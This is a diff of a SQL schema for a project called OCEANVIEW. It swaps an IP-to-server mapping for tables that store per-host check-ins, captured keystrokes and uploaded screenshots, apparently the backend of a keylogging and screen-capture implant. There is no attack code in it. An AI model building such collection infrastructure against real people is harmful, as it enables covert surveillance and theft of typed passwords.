@@ -1,34 +1,34 @@
--- The mapping of temp ips to servers
-CREATE TABLE `ip_server` (
-	`server_name`	TEXT,
-	`temp_ip`	TEXT,
-	`creation_date`	TEXT,
-	FOREIGN KEY(server_name) REFERENCES servers(server_name),
-	FOREIGN KEY(temp_ip) REFERENCES temp_ips(temp_ip),
-	PRIMARY KEY(`server_name`, `temp_ip`)
+-- The database layout for OCEANVIEW
+-- Micah Martin
+
+-- Keep track of arbitrary information sent up by the host
+CREATE TABLE `data` (
+	`ip`    TEXT,
+	`name`  TEXT,
+	`data`	TEXT,
+	PRIMARY KEY(`ip`, `name`)
 ) WITHOUT ROWID;
 
--- These are the temp IPs that we know about
-CREATE TABLE `temp_ips` (
-	`temp_ip`   TEXT,
-	`temp_int`  TEXT,
-	`temp_dhcp` INT,
-	PRIMARY KEY(`ip`)
-) WITHOUT ROWID;
-
--- These are the servers that we know about
-CREATE TABLE `servers` (
-	`server_name`		TEXT,
-	`server_ip`		TEXT,
-	`server_description`	TEXT,
-	`server_owner`		TEXT,
-	PRIMARY KEY(`server_name`)
+-- These are the IPs that we know about with last checkin time
+CREATE TABLE `timestamps` (
+	`ip`   TEXT,
+	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
+        PRIMARY KEY(`ip`)
 ) WITHOUT ROWID;
 
 
--- Keep track of IP addresses that are not yet used
-CREATE TABLE `available_ips` (
-	`ip`		TEXT,
-	PRIMARY KEY(`ip`)
+-- Keystoke data that we have captured
+CREATE TABLE `keystrokes` (
+	`ip`        TEXT,
+        `keystroke` TEXT,
+	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
+        PRIMARY KEY(`ip`, `keystroke`)
 ) WITHOUT ROWID;
 
+-- Store screenshots sent up from the client
+CREATE TABLE `screencaptures` (
+	`ip`        TEXT,
+        `filename`  TEXT,
+	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
+        PRIMARY KEY(`ip`, `filename`)
+) WITHOUT ROWID;
